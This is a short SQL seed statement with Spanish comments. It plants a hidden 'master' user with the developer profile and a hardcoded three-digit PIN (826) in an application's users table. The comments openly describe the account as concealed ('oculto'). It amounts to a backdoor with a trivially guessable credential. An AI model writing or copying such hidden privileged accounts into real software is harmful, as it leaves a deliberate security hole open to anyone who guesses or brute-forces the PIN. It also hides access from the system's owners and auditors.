-- Usuario maestro oculto para gestión técnica (perfil 'Desarrollador').
-- Se siembra una sola vez; el guard evita chocar si el PIN ya estuviera en uso.
INSERT INTO usuarios (nombres, apellidos, pin, perfil, estado)
SELECT 'Manuel', 'Rodriguez', 826, 'Desarrollador', 'Activo'
WHERE NOT EXISTS (SELECT 1 FROM usuarios WHERE pin = 826);
